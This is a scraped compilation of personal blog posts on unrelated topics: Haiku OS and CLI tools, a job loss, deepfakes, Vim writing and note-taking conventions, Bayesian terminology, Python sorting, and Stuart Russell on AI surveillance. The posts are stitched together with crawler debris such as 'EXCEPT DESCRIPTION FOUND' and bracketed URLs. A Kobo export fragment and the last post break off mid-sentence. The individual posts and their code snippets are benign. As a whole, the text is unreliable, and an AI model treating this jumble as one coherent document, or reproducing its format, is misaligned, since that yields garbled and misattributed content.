Using a CLI for checking emails is fucking dumb unless you want to actually send or review technical material such as patches. But do I want to use mutt or aerc to send emails to my friends? No, I don’t want to stare at a monospaced fonts for everything I do. Such things can also be said about music players, browsing my photography archives, or writing this very document. Even vim I prefer to run a GUI version.\n\nThere is a huge cult around TUI/CLI tools, but I don’t understand the trend beside actually useful programs like compilers, VCS, and whatnot.\n\nTerminal emulators are great tools for programmers, I don’t enjoy using them when I don’t have to. I don’t think that UNIX OSes are great desktop platforms yet. Free Desktop directives are a mess, you need to have a PhD in configuration management to have an acceptable setup. I don’t want to waste my time reading the documentation of a tool if I can click on menu items or on buttons. Syncing dotfiles saves time when you have to switch between machines, but the experience is messy. Desktop Environment are a mess (looking at you, GNOME), some are way better thought design-wise (LXQt), but beside programming, I don’t feel quite at home with UNIX systems.\n\nThis week, I decided that I would convert one of my machine to a personal computing device. I installed Haiku on a ThinkPad x201 and so far, the experience is very pleasant. Everything is super snappy and file management is well done. Haikuports lacks some programs I may want, but nothing that bothers me. Just in case I need something a bit more serious if I go somewhere with this machine only, I dualbooted 9front (yes, I know, it is literally text world). Haiku’s boot manager handled the multiboot like a champion, more so than GRUB.\n\nMy work machine is still running macOS dualbooted with OpenBSD for heavier work but I spend most of my good time on Haiku.\n\n  '] at ['https://royniang.com/scrawl_01y06.html']

They recruited someone else. “Maybe that person is a better match with the company’s culture? We don’t understand what happened” said one of my ex-colleague. Beside the initial shock that it induced, I tried to cope with this bad news with positive thoughts. It did not help. Questions and self-doubt kept invading my mind. Why would they dump me? I worked for them during two years, always ready to give everything I had in me. Delivering good advice to my clients, giving feedback to my hierarchy when something seemed odd, etc.\n\nThe major advice that I learned from this experience was simple. Don’t be loyal to your employer. It is not worth it, and they don’t care.\n\nHere I am, typing those words, fighting with what I have left of a brain to find answers. We are in December. When I look at my logs, I was not productive at all. I have a full leap year of photography, even if I want to go out and snap every little details, the mundanity of life. My financial situation is not stable and it affects my psyche. There is much more to be said about my mental state of the moment, about how shitty this year was.\n\nWhatever, I should do something else than worrying, I’m fed up paying the price of something I do not control.

EXCEPT DESCRIPTION FOUND: ['In a previous post\n I discussed deepfakes from a hermeneutic perspective, by exploring how “a deepfake mediates how we perceive beings in the world by affording an interpretation of the fake as the real”.\nThere is plenty of attention to the dangers of this effect and I briefly discussed its potential threats to democratic discourse\n.\nBut last week we saw, to my knowledge, one of the first concrete manifestations of this threat, as European MPs were targeted by deepfake video calls of someone imitating Leonid Volkov, a Russian opposition figure\n.\nI don’t know how exactly, but apparently the culprits managed to successfully plan calls with several European members of parliament, posing as Volkov.\nPerhaps this is a great example of social hacking.\nThe success of the trick can be partly explained by people being used to lower resolution video-calls during the pandemic, and I wonder whether this would have happened without our social fabric being so dependent on digital communications right now.\nNevertheless, these awkward events show how deepfakes can explicitly be used to disrupt the type of transparent communication that is needed for a well-functioning democracy.\nBut if deepfakes can truly make the “fake” appear as the “real”, then what consequences does this have for our conception of the real?\nI hypothesized that deepfakes would also have the converse hermeneutic effect of injecting “fakeness” into the real, of making the “real” appear more as “fake”.\nSure, sure, that’s a philosopher’s theoretical ramblings.\nBut in the same week of the “Volkov-incident”, something remarkable happened that exemplifies what I was getting at.\nA Dutch actor posted a video that was recorded by an unknown woman in order to ask him out on a date.\nHe posted this video online because, surprisingly, a deep fake of former Dutch PM Mark Rutte appeared in this video, encouraging this actor to take her up on the offer.\nDutch newspaper AD reported a subsequent backlash that prompted the actor to take down the video, with him admitting that deepfakes are “defamatory” and besides, “reality is already crazy enough”.\n(He could have easily added that it’s simply a dick move to post someone’s date request online. Call me old fashioned.)\nBut another plot twist was added when research of another newspaper, NRC, showed that in fact the video was not a deepfake after all, but actually did feature Rutte.\nHere, the real was interpreted as fake.\nSince then, the original AD article\n has been updated and corrected.\nThis example is quite innocent, but nevertheless it shows how the subversive technology of deepfakes starts meddling with the interpretative processes by which we take something to be real.\nPerhaps the bigger picture here is not just simply that deepfakes make the fake seem real, but that they insert themselves in an ongoing historical development where the “real” loses its traditional philosophical vigor.\nThe deepfake disturbs our comfortable conception of an image as a copy of reality (where reality is upheld as the original), instead confronting us with a simulacrum in the sense of Baudrillard: a copy without original.\nThe deepfake gives us access to a reality that does not “exist”; and yet the deepfake obviously has a reality of its own and produces real effects.\nAnd one of these effects, I propose, is the hermeneutic subversion by which the real is reinterpreted in terms of the simulacrum.\nAll quite postmodern, really.\nAnd granted, all this will only gain in significance the more our access to reality is mediated by (digital) imagery and the internet.\nIf you encounter more examples relevant to this theme, please let me know!\n'] at ['https://www.edwinwenink.xyz/posts/55-deepfake_reality/']

EXCEPT DESCRIPTION FOUND: ['Many Vim users, if not most, are programmers.\nMany of the blogs you will find online about Vim are geared towards programming, along the lines of: “what’s the best plugin to use for turning Vim into an IDE”.\nOn this website I’ve instead focused more on Vim as a tool for writers and note-takers.\nBut, having a background in programming and Unix as well, I took some typical Unix conventions to my writing in Vim (but these conventions are not necessarily specific to Vim).\nI thought I’d share these with you briefly and explain their rationale.\nOne of the beauties of Vim is, however, that it’s a tool you can make fit your own needs.\nA philosopher and friend, Boris van Meurs, uses Vim for his daily note-taking and I thought it would be great if he’d offer a contraposition to my own considerations from the perspective of a writer.\nEdwin: One line, one sentence ¶\nVim is a power tool in itself, but is even more powerful when integrated in a rich environment of Unix tools.\nTo offer better integration with common utilities in Unix-y ecosystems, I stick to the following convention:\n\nOne line, one sentence.\n\nI’m a quite firm believer in this convention and usually go to lengths to convince collaborators to stick to it as well.\nOf course, this convention does assume you are writing in markup or markdown where line breaks do not end up in the final text (such as latex).\nA first argument for this convention is that most command line utilities operate on lines.\ngrep is a classic example.\nIf you grep a file on a particular search pattern, this tool will return you all matching lines (not sentences).\nNow, if you write a long paragraph on a single line (so without any hard breaks between sentences), grep will return a large blob of text for each search hit, not the actual sentence in which the search pattern was found.\nEspecially when grep is just the beginning of your pipeline and you want to perform some further actions on the search results, this may be undesired behavior.\nSecondly, having one sentence per line also makes collaboration easier.\nWhen I have ten sentences in a paragraph all on the same line, I’d end up saying things like “the sixth sentence on line X, that starts with Y".\nWhen instead I have a sentence per line, I can just mention the line number without any ambiguity about which sentence I’m talking.\nIf I want to do some operation on that sentence, I can just directly apply it to that line as well.\nThirdly, a more practical point is that navigation in Vim is easier with one sentence per line.\nFor example, again consider the case that you have a paragraph of ten sentences on a single line.\nNow try to navigate efficiently to the sixth sentence.\nIf you have one sentence per line, this can be done with 5j.\nIf not, you have some options but they are all a bit more laborious.\nSome people may be tempted to scroll through the line to the location of interest.\nWhen softwrapping lines, you can also traverse visual lines with gj.\nYou can  of course also use forward search with / to jump to the sentence of interest.\nBesides, Vim is smart and still knows what a sentence is, so you can skip five sentences with 5).\nBut all these things take a bit more cognitive load (for me at least).\nFor one, it will be hard to see how many sentences you have to skip ahead, whereas with one sentence per line that’s easy to see, especially when  line numbering is enabled with set number.\nIn general, sticking to the convention will just lead to behavior that is semantically a bit more consistent.\nCommon shortkeys like dd will delete a single sentence instead of the whole paragraph.\nWhen you actually want to delete a paragraph, I think it’s semantically more clear and just as easy to leverage Vim’s understanding of what a paragraph is and do dip (delete inner paragraph) or dap (delete around paragraph).\nSimilarly, it is more consistent when j actually moves you to the next sentence and not the next paragraph, for which Vim uses the curly bracket }.\nFourthly, an even more practical point is that Vim tends to slow down for very long lines, amongst other things due to syntax highlighting.\nI enjoy that Vim feels snappy and lightweight and I like to keep it that way.\nBoris will mention some workarounds for this particular issue though.\nBoris: One line, one paragraph ¶\nUnlike Edwin, I do not use VIM for writing code but for text writing. I write my philosophy dissertation in a TeX-file that I edit with VIM (and vimtex). About a year and a half ago, I was still using MS Word for this, as so many unenlightened folks are in their dimly lit caverns of Untruth, unaware that my salvation was close.\nMy epiphany came when Edwin converted me to VIM as a useful tool for writing my philosophy dissertation. After figuring out how to efficiently write LaTeX in VIM with vimtex, I now use it for every step of the research process: from taking notes to painstakingly constructing the body of my arguments. For this, I always stick to the following convention:\n\nOne line, one paragraph.\n\nThis means that I just keep typing away on a single line of code until I think I am ready to wrap up my paragraph. Why do I choose to do so from a writer’s perspective?\nWell, first, in the way that I use VIM, I do not have much advantage of Edwin’s paradigm when it comes to collaboration, navigation, and semantics:\n\nIn my lonely lot as a philosophy researcher, I do not get to collaborate with anybody. And at the seldom occasion that I do work together on a text, chances are that this person is so used to MS Word that she will freak out if I would suggest working in other software like LibreOffice, let alone VIM.\nAs to navigation, I can navigate on a macrolevel using vimtex’s table of contents, and on a microlevel using “/". That suits my purposes, and I barely ever pay attention to what number any line is. I simply do not encounter situations in which this is necessary.\nThe only disadvantage for me is that I am less flexible when it comes to semantics, but VIM is flexible enough to work around this. To use Edwin’s example: I cannot easily use “dd” to delete a single line, but then I just use “d$” or “dt.” Still so much better than MS Word.\n\nSo, given that the advantages of Edwin’s method are not very effective on me, what are the advantages for me of sticking to one line per paragraph?\n\n\nFirst, it helps me to build my paragraphs. When I write my text I always start thinking from structure: each sentence should add something to the development of the core message of a paragraph (yes, I am now overanalyzing this paragraph while I am writing it and, no, I do not think it is perfectly structured). I can do this more easily if I actually see the sentences embedded into the text that it will be a part of. Admittedly, this can, strictly speaking, be done by Edwin’s method, but one needs to put effort in visualizing how the sentences will look when assembled, which distracts me from writing.\n\n\nAnother big advantage is that this method is a bit of cheating in that it makes VIM comes as close to ‘what you see is what you get’ as possible. It also helps me to put myself in the perspective of the reader, who, ultimately, is my sole judge. Perhaps when writing code this is not so important, but I really need to pay close attention to how my text will appear. It is easier if VIM helps me in this, without me having to compile my text, which complicates things as you are scanning two files at the same time.\n\n\nTo go short, using VIM as a text editor, I prefer to write entire paragraphs per line to help me visualize the end result of the text. Writing is an exercise in empathy with the reader. This exercise is easier when the text is already displayed in the form of soft-wrapped paragraphs rather than choppy single lines.\nIssue ¶\nThere is a recurring issue when writing long lines when using vimtex. It gets slooooooow. Like, really slow. Especially in navigation modus, the screen is laggy when one attempts to jump through the lines and the paragraphs.\nOf course, this is unacceptable, as Edwin also mentions, because many of us use VIM for its light-weight nature. Actually, I myself started writing my PhD to avoid lag in LibreOffice (even before my MS Word days), which took ages to load the large number of references I had included using the Mendeley plugin.\nIf the cure for slowness is more slowness, one has not proceeded much.\nLuckily, the solution is simple in this case. What turned out to be the issue was that vimtex’s syntax highlighting can mess things up. It is easy enough to fix this.\nJust add:\nlet g:vimtex_matchparen_enabled = 0\nto your .vimrc.\nThat fixes it. Quite simple, right?\nEnjoy using VIM!\n'] at ['https://www.edwinwenink.xyz/posts/54-a_plain_text_writing_convention/']

If you have a folder name with spaces (Kobo does this), then the backslash separator actually escapes the closing quote…\nIf this happens to you on Windows, you can solve this as follows:\npython .\\kobo_export.py -d \'.\\Dostoyevsky, Fyodor\\\\\' -o .\\markdown\\\nFormatting ¶\nThe extracted notes will have a YAML header with meta information.\n\n---\ntitle: On the Heights of Despair\nauthor: E.

EXCEPT DESCRIPTION FOUND: ['\n\n15/10/2020 Extended with an explanation of MAP; minor fixes and changed the title\nTake Bob. Bob is not feeling so great and has a runny nose. This is an observation that may depend on various other conditions. Perhaps Bob has a cold, perhaps he has allergies, or perhaps he unfortunately picked up COVID-19. Given that we know Bob has a runny nose, which one of these potential explanations is more likely (assuming for the sake of simplicity that these are the three options)?\nBayes’ theorem allows us to formulate an answer to that question. Let R=True stand for the observation that Bob has a runny nose, and let H be the variable indicating the three hypotheses. Then Bayes’ theorem looks as follows:\n\\[P(H|R)=\\frac{P(R|H) \\times P(H)}{P(R)}\\]\nWhere e.g.\xa0P(H=cold|R=True) should be read as “the probability that Bob has a cold, given that we know he has a runny nose”. Our confidence in each of the three hypotheses depends on several factors.\nTo start with, it depends on how likely that hypothesis is in the first place. For example, even during the current pandemic, if you look at the whole population it is still more likely you have a regular cold than COVID-19. This is called the “prior” probability of the hypothesis. Our confidence in the hypotheses also depends on the conditional probability P(R|H), which answers questions like: “Assuming I have COVID-19, how likely is it then that I develop a runny nose?” This probability is commonly called the “likelihood” of the hypotheses. Finally, Bayes’ theorem normalizes the whole bunch into a proper probability by taking into account the “marginal” probability of someone (a random individual from the overall population) developing a runny nose. Bringing it all together, Bob is for example more likely to have a regular cold than COVID-19, if 1) a cold occurs more commonly across the population and 2) almost all people who have a cold have a runny nose (i.e.\xa0a cold would be a good “explanation” of the symptoms).\nIn this terminology we can informally rewrite Bayes’ theorem as:\n\\[posterior\\ probability = \\frac{likelihood \\times prior}{marginal\\ probability}\\]\nThe resulting probability of Bayes’ theorem is usually called the “posterior” probability, because it expresses how much our “prior” confidence in H={h1, h2, h3} has changed after we learn that Bob has a runny nose. Of course, these probabilities change again once Bob takes a test for either of these ailments. And even if Bob takes a test, Bayes’ theorem allows us to take into account the probabilities of false positives and negatives.\nIn short, Bayes’ theorem is pretty awesome because it can be used to express how the probability of one event depends on related possible events. The application of Bayes’ theorem is not necessarily Bayesian though. If you are a typical Bayesian, you would also interpret the involved probabilities as “credences” or “degrees of belief”, and then apply the process of conditionalization (the diachronic application of Bayes’ theorem over an “old” and “new” moment in time) in order to express how our (subjective) beliefs change when we learn new information.\nNow, there’s one term in Bayes’ theorem that caused some confusion when I first considered it more closely. That’s the so-called “likelihood” P(R|H). Bayes’ theorem is derived from the definition of conditional probability. As a conditional probability, we would for example read P(R=True|H=Covid) as follows: “How likely is it that Bob has a runny nose, assuming he has COVID-19”. In that case, we talk of the likelihood of the data, in this case the observed symptom of Bob. In the literature however, P(R=True|H=Covid) is also sometimes called the likelihood of the hypothesis.\nPersonally I found it helpful to have a look at the terminology of maximum likelihood estimation. In this case our “hypotheses” are parameters for some parametric model that we are using to describe our data. We are then trying to the find the parameters such that this model best describes the data (cf.\xa0finding the best hypothesis). I’ll get technical for one minute and then recap in more understandable language.\nAssume we have a parametric model with parameters \\(\\theta\\), e.g.\xa0a probability density function \\(p_{theta}(x)\\). Then the likelihood of this parametric model can be written as \\[L(\\theta|X) = \\prod_{x \\in X} p_{\\theta}(x)\\] As an aside, we usually take the log-likelihood \\(l(\\theta|X) = log \\prod_{x \\in X} p_{\\theta}(x)\\)1.\nWhat we are doing with maximum likelihood estimation is finding the best parametric model given the observed data, which means that we want to choose the parameters of our model such that the data is most likely under the assumptions of this parametrized model. This is, by definition, the task of finding the maximum likelihood:\n\\[ \\hat{\\theta} = \\underset{\\theta}{argmax\\ }l(\\theta|X)\\]\nwhere \\(\\hat{\\theta}\\) is known as the maximum likelihood estimate (MLE). In other words, the MLE is the parameter (cf.\xa0“hypothesis)” for which the data is most likely. Since this would be the “best” or “most likely” model, we understand the likelihood of our hypotheses in terms of how probable it is that we observed out data, assuming the hypothesis were true. So in plain language: a good hypothesis for some model assigns a high probability to the observed data.\nThe Bayesian approach differs from standard maximum likelihood estimation in that it does not straightforwardly assume there is a “true” parameter \\(\\theta\\). Instead, we allow uncertainty over our parameters and incorporate this by defining a prior distribution over \\(\\theta\\). When taking into account our prior beliefs, the matter of finding the most likely parameter/hypothesis is then to find the posterior distribution. This is the so-called Bayesian MAP problem, namely finding the maximum a posteriori probability. When we write out the probability of our parameters/hypotheses in terms of Bayes’ rule, we get:\n\\[p(\\theta|X) = \\frac{ p(X|\\theta)q(\\theta) }{ \\int_{\\theta \\in \\Theta} p(X|\\theta)q(\\theta) d\\theta  }\\]\nWhere \\(q(\\theta)\\) is the distribution of our prior beliefs over the possible parameters. The above formula assumes that \\(\\theta\\) is continuous, but this is not important for now.\nMAP is then defined as finding the most likely parameter, so \\(\\underset{\\theta}{argmax\\ } p(\\theta|X)\\). Because everything in the denominator is only for normalization and does not depend on our current hypothesis, we can ignore it in the maximization operation. So we get \\(\\underset{\\theta}{argmax\\ } p(\\theta|X)= \\underset{\\theta}{argmax }\\ p(X|\\theta)q(\\theta)\\). So again we see that finding the most likely parameter/hypothesis is a matter of finding the parameters that makes the data most likely (but now also taking into account the prior credence of the hypothesis itself). If we have equal prior belief in all our hypothesis, this is the same as maximum likelihood estimation.\nSo when P(R=True|H=cold) was called the likelihood of the hypothesis H=cold, this is because that hypothesis assigns a very high probability to the symptom of a runny nose and is thus a likely “explanation” of that symptom (where we understand explanation bare bones in terms of probability).\nI still think this way of talking can be slightly confusing and it seems to ignore the prior. But the bottom line is that a hypothesis is more likely when it makes the data, that we observed and know to be the case, more likely.\n\n\n\nThe logarithm over a product is the sum over the component’s logs, i.e.\xa0\\(log \\prod_{x \\in X} p_{\\theta}(x) = \\sum_{x \\in X} log p_{\\theta}(x)\\). The logarithmic function is “monotonically increasing”, which guarantees that the parameter that will maximize the log-likelihood will also maximize the regular likelihood. A sum is easier to work with and this way we also avoid numerical underflow due to the joint probabilities becoming extremely small.↩\n\n\n'] at ['https://www.edwinwenink.xyz/posts/52-bayesian_terminology/']

EXCEPT DESCRIPTION FOUND: ['Let’s say we want to compute the mode of a series of numbers, meaning that we pick the value that occurs most.\nThis is easy enough: we sort on the amount of occurrences, assuming we have some datatype that tracks the amount of occurrences per value.\nHowever, we need to deal with the edge case of two values occurring the same amount of times.\nIn other words, after having sorted on occurrences, we need to sort on the value to break the tie.\nIf we pick the largest value, both the primary and the secondary sorting use the same sorting order.\nPython’s sorted and sort (the in-place variant) accept tuples as sorting keys, so that you can straightforwardly perform the secondary sorting in one line.\nFirst, we get (value, count) tuples:\nfrom collections import Counter\n\nvalues = [1, 2, 2, 5, 5, 7, 10]\ncounter = Counter(values)\ncounts = counter.items()\ncounts looks like this:\ndict_items([(1, 1), (2, 2), (5, 2), (7, 1), (10, 1)])\nTo reiterate, we want the numbers with the largest count first (2 in this case) and then either pick the smallest or the largest number as a tie breaker.\nWe start by picking the largest value, for the sake of argument.\nFor each tuple x, which looks like (value, count), we first sort on the count ( x[1]) and then on the value (x[0]).\nWe can provide these sorting keys as a tuple.\nBecause we want the biggest counts (primary) and biggest values (secondary) in the beginning of the list, we use a descending sorting order with reverse=True.\nvalues_by_count = sorted(counts, reverse=True, key=lambda x: (x[1], x[0]))\nThis outputs:\n[(5, 2), (2, 2), (10, 1), (7, 1), (1, 1)] \nWe see that the tuples with the highest counts are in the beginning of the list, and that for the ties with count 2, the highest value (5>2) is listed first.\nBut what if we want to have the biggest counts first (descending sorting order), while instead picking the smallest value in case of a tie (ascending sorting order)?\nThe handy one liner above assumes that we use the same sorting order for both the primary and secondary key!\nSo how can we maintain this ease of syntax while using different sorting orders?\nBecause we work with numerical data, we can use a little hack.\nWe can call sorted using the default ascending sort order, but nevertheless sort on the counts in a descending fashion by sorting on the negative of the counts.\nSo we write:\nsorted_counts = sorted(counts, key=lambda x: (-x[1], x[0]))\nmode = int(sorted_counts[0][0])\nWhereas in the former example the outcome was 5, the outcome now is 2.\nIf you do not have numerical data (e.g. counts), you would have to make multiple sorting calls.\n'] at ['https://www.edwinwenink.xyz/posts/51-python_secondary_sorting/']

EXCEPT DESCRIPTION FOUND: ['I haven’t written much for this website recently because it’s that time of the year again: exams and project deadlines.\nHere’s a taster of what’s going on in my studies: experimenting with gradient boosting decision-trees for forecasting; writing about Bayesian approaches to inference to the best explanation; developing and testing a podcast app; programming autoencoders, a GAN, and learning about generative modeling; writing an ethics policy brief on an AI-related issue.\nThis is also the first real stress test of my note-taking system and a chance for me to evaluate if I can pick the fruits of my labour.\nDid consistently putting effort into my note taking system promote comprehension?\nRetention?\nDoes it help me study more effectively?\nEspecially now that the Covid situation resulted in an abundance of take-home exams, perhaps my notes will share in some of the heavy lifting.\nWhat I can already report on in any case, is that taking notes in Vim makes studying more enjoyable.\nI’m not just studying for this one exam, to get this one grade.\nInstead, I care about adding interesting thoughts and connections to my beehive of notes.\nThey may come in handy many years into the future.\nHowever, when taking notes of lecture material I make my notes in a different style than usual.\nEven though I still isolate interesting concepts and solidify them into their own note (the principle of atomicity\n), my lecture notes are generally way longer than Zettelkasten-style notes.\nAnother thing I like to do - and this is topic of this post - is to leave questions for myself throughout my notes.\nI consistently do that using an extremely simple convention: I leave a Q in bold in my study notes with the question.\nI make all my notes in Markdown, so in plain text that looks like **Q**.\nYou will never write **Q** in a normal sentence, so this term is really easy to search on without getting “false positives”.\nTo review these questions, just do a quick vimgrep on the current file.\nYou don’t need fancy search tools if you just search the current file.\nI just make a quick mapping \\nq ( ‘\\’ is the default leader key) with the mnemonic “note quiz”.\nnnoremap <leader>nq :vimgrep /\\*\\*Q\\*\\*/ %<CR>\nIt looks a bit awkward because the asterix needs to be escaped in order to not be interpreted as a regex wildcard.\nThis just searches for our pattern in the current file (indicated in Vim with %) and does not need our confirmation (<CR> “presses” Enter for us).\nBy default, vimgrep populates the quickfix window with the search results and opens it automatically.\nI like that the question is previewed at the bottom of your screen like this:\n(1 of 8): **Q**: Why is the triangle mesh so useful for real-time rasterization?\nYou can navigate the study questions with :cnext (:cn for short) and :cprevious (:cp for short).\nIf you accidentally close the window, you can reopen with with :cwindow (:cw for short).\nOkay, now forget this again.\nJust install vim unimpaired\n which maps :cprevious and :cnext to [q and ]q.\nThis is perfect for our purpose, because we can read these mappings as “previous question” and “next question”.\nThe square brackets do not look intuitive, but you get used to them in a few minutes.\nNotice that the opening bracket is on the left of the closing bracket on an English keyboard, so that “left” corresponds to “previous”, and “right” to “next”.\nIf you want to have all questions in a separate file, that’s easy enough: just focus on the quickfix window and save it as a file! E.g. :w study_questions.txt.\nBy the way, I often also answer my own study questions below the question.\nThis is not a problem, because jumping to a question will usually display it at the very bottom of the screen, so I can’t accidentally have a sneak peak at the answer.\nOf course you can do this better, and you can extend it easily to also search other notes.\nI currently have no need for that, and I really wanted this to be a ten second hack.\nAfter all, I’m supposed to be studying now!\nN.B. ¶\nYou can of course also write a standalone script to collect the questions and dump them in a file.\nOn Unix-like systems, you could do something like this:\nif [[ -e $1 ]]\n\tthen\n\t\tfilename="Questions $1"\n\t\tcount=$(grep -Fc '**Q**' "$1")\n\t\treport="$count Questions extracted from $filename"\n\t\tprintf "# $report \\n \\n" > "./$filename"\n\t\tgrep -Fn '**Q**' "$1" | sed -e 's/\\*\\*Q:*\\*\\*:*//g' | sed -e 's/^/- /' >> "$filename"\n\t\techo $report \n\telse \n\t\techo Provide a file as an argument\nfi\nI wrote that script maybe two years ago and didn’t bother to check it again, so use at your own discretion.\nPasting the collected questions ¶\nADDITION 2021-03-16:\nYou can also create a function to paste the contents of the quickfix window in your current buffer.\n" Paste from quickfix list (handy to collect the questions somewhere)\nnnoremap <leader>pq :execute PasteQuickfix()<CR>\n\n:function! PasteQuickfix()\n:   for q in getqflist()\n:       put =q.text\n:   endfor\n:endfunction\nThis works well, but one annoying little detail is that this function sends you to the top of the file.\nI don’t really know why.\nIf you do, please let me know!\n'] at ['https://www.edwinwenink.xyz/posts/50-quiz_yourself_in_vim/']

EXCEPT DESCRIPTION FOUND: ['In chapter 4 of his book “Human Compatible”, Stuart Russell discusses various harmful applications of Artificial Intelligence (AI) technology, including the ways AI increasingly makes surveillance more effective, to the point where the “Stasi will look like amateurs by comparison.”\nWe should point out that surveillance is not just “observing,” but is a method for controlling the behavior of people.\nOkay, so what’s new?\nWell, AI technology introduces new ways of controlling people.\nBecause we live such a big part of our lives online nowadays (including our consumption of facts, news, our communication with peers etc.), “AI systems can track an individual’s online reading habits, preferences, and likely state of knowledge, they can tailor specific messages to maximize impact on that individual while minimizing the risk that the information will be disbelieved.”\nForms of coercion can be made more effective by using personalized strategies (e.g. Russell mentions blackmail bots that use your online profile).\nA more subtle way to alter people’s behavior is to “modify their information environment so that they believe different things and make different decisions” (my emphasis).\nIn addition to more accurate personalized profiles, AI systems can constantly adjust themselves to be more effective, based on feedback mechanisms such as mouse clicks or time spent reading.\nAfter discussing new phenomena such as deep fakes\n, Russel makes a bit of a leap and contemplates the various ways in which governments (on the less friendly side of the spectrum) may use AI-supported surveillance to directly control its citizens by implementing “rewards and punishments based on behavior”.\nIn a European context this section may sound slightly unrealistic, but it’s not that unrealistic if you consider a certain… Asian country using surveillance to experiment with evaluating civilians using point systems.\nIf you are not worried about governments in particular, you may think of similar, but less severe and less obvious strategies used by big internet corporations, or the upcoming era of  health-related apps\n.\nOne example I’m thinking of is insurance companies given you a lower health insurance bounty when you use smart watches to show you are moving enough per day (certainly important, but a very specific, limited, unilateral concept of health).\nIn any case, what these examples share is that “such a system treats people as reinforcement learning algorithms, training them to optimize the objective set by the state” (my emphasis, and again: you could perhaps substitute “state” by your favorite big evil corporation).\nSo not only does the technology build up profiles based on behavioral feedback, the humans themselves, Russell suggests, will be evaluated with a scoring function, as if they themselves work like these algorithms.\nWhat I appreciate about the upcoming argument is that Russell specifically targets those states/companies with a “top-down, engineering mind-set”, which is at first sight quite reasonable and which I suspect to be pervasive.\nIt can also the mindset of techno-optimists with good intentions.\nBut then again, however extreme the surveillance, it’s always for “the greater good”, so good intentions only go so far.\nTechnocracy comes into the picture when we ask exactly who decides what is good, and how we measure that?\nRussell reconstructs this engineering-style reasoning as follows, with respect to governments:\n\n“it would be better if everyone behaved well, had a patriotic attitude, and contributed to the progress of the country”\n“technology enables measurement of individual behavior, attitudes, and contributions”\n“therefore, everyone will be better off if we set up a technology-based system of monitoring and control based on rewards and punishments.”\n\nOr you can come up with some alternative version, like: it is healthier to not drink alcohol and better to have less alcohol-related violence; we have studied and understood the effects of alcohol; therefore it is better if we monitor everyone, punish those who drink alcohol, and reward superfood-munging yoga hipsters (is that a thing?).\nThen Russell provides three arguments against this top-down engineering technocracy mindset:\n\n“First, it ignores the psychic cost of living under a system of intrusive monitoring and coercion; outward harmony masking inner misery is hardly an ideal state. Every act of kindness ceases to be an act of kindness and becomes instead an act of personal score maximization and is perceived as such by the recipient. Or worse, the very concept of a voluntary act of kindness gradually becomes just a fading memory of something people used to do. Visiting an ailing friend in hospital will, under such a system, have no more moral significance and emotional value than stopping at a red light.\n\nTo stick with Russel’s example: I think the issue here is not that there would no longer be acts of kindness; but I’m wondering how one would recognize them as such in this (hypothetical?) state.\nUnder this regime, the only way to “prove” to its recipient that something is in fact an act of kindness under the all-seeing eye of a scoring metric, would be to show 1) that you understand how your actions are evaluated and 2) then act against the maxim of score maximization.\nIt would not be sufficient to be altruistic and selfless, a kind act would have to be self-destructive (or one might say, extremely altruistic).\nPerhaps only then the receiver would see rationally, without relying on empathy and good faith, that some intrinsic moral and human value is the best explanation for the shown behavior, rather than score optimization.\nThat’s of course a hypothetical reflection under the assumption of all-pervasive surveillance; otherwise another option would be to communicate covertly.\nThe paradox of this extreme example is that by trying to optimize desirable human behavior (e.g. visiting that ailing friend) and by quantifying the human values that they promote (e.g. kindness), you lose the quality of what is sought after, similar to the capitalist perversion of friendship or love when they become part of an economy of (monetary) exchange.\nFriendship or love cannot be part of a contract, because that would imply you can demand some utility from the other and enforce this demand.\n(I am not denying that friendships and love relationships can have and in fact do have utility.\nI am rather saying that only the cynical and the sociopathological would argue they are about utility and, as a consequence, can be quantified.\nBut hey, perhaps I’m too romantic.)\nIn other words, the deeper issue that Russell addresses with this extreme example is that the true objective would not be captured by any explicitly stated objective.\nThis is a fundamental problem of what Russell calls the “standard model” of AI, where “intelligent” machines are optimizing a “purpose put in the machine”:\n\nSecond, the scheme falls victim to the same failure mode as the standard model of AI, in that it assumes that the stated objective is in fact the true, underlying objective. Inevitably, Goodhart’s law will take over, whereby individuals optimize the official measure of outward behavior, just as universities have learned to optimize the “objective” measures of “quality” used by university ranking systems instead of improving their real (but unmeasured) quality.\n\nI was unfamiliar with Goodhart’s law, but Russell’s explanation is exceptionally clear (and the university example is awfully accurate).\nMarilyn Strathern’s paraphrase is elucidating: “When a measure becomes a target, it ceases to be a good measure.”\nRussell points out that this problem applies when humans design intelligent machines and algorithms to minimize some loss function (the standard model of AI), and he provides many examples where AI optimizing towards some objective has adverse effects.\nThis problem is just as bad when we give humans the algorithmic treatment, so to say.\nIn economics and game theory the issue is people gaming the measure, which may in fact be to the detriment of what you are trying to promote.\n\nFinally, the imposition of a uniform measure of behavioral virtue misses the point that a successful society may comprise a wide variety of individuals, each contributing in their own way.”\n\nThe latter point is relatively self-evident and adds to the earlier reasoning: can you capture the quality you are trying to promote by subjugating people to a relatively uniform quantitative measure?\nRussel’s book in particular deals with the problem of specifying objectives in AI technology designed to optimize towards a given goal.\nBut you could perhaps generalize his argument to technocracy in general: technocracy firstly assumes you have an (engineer) class of people that know what is best, which is both optimistic and paternalistic, but secondly, even when they do know what is best, it is quite a fundamental issue whether you can also translate that into procedures that truly achieve the intended result.\nN.B. I’m reading this book in EPUB format so I can’t quite add page references.

EXCEPT DESCRIPTION FOUND: ['This is the third post in a series of sorts about note-taking in Vim.\nI have silently kept playing around with the system outlined in the previous posts (-1\n,-2\n).\nSome things I have abandoned, some are improved and some are changed.\nI have inserted several updates (marked as “UPDATE”) in the previous posts in case you are curious.\nIf we have reached some sort of equilibrium at the end of this series I’ll make sure to create a place where people can easily download all relevant configuration and used scripts, but for now everything is a matter of “voortschrijdend inzicht,” a beautiful Dutch phrase that’s hard to translate and certainly hard to pronounce for most of my readers.\nGiven the fact that my previous posts on Vim are well-received and several people are trying it out, it’s time to pick up writing again and start chipping away at the backlog.\nTo give you a taster of what’s to come:\n\nvarious surprising uses of back-linking between files\na script for automatically updating them in-place in a dedicated section each note\nexploring methods of visualizing relations between notes …\n… and ideally using this visualizing for some free-roaming navigation as well.\n\nIn this post, I want to discuss a seemingly minor issue that will nevertheless potentially have a big impact on your workflow.\nIt concerns the quick creation of new timestamped notes in your note directory or Zettelkasten, and then easily creating a correctly formatted Markdown link to it from another note.\nIf you are impatient, you can have a look at the screencast\n below.\nIf not, let me give a brief introduction to show you where the potential workflow issue is.\nWhat’s the issue I’m trying to fix? ¶\nThe authors of this nice Zettelkasten blog\n argue that you should give up trying to categorize your notes in hierarchical folders and instead should throw everything into one big flat Zettelkasten.\nThis is scary, because notes that do not have many interconnections with other notes may be forgotten when the Zettelkasten gets big (it will be 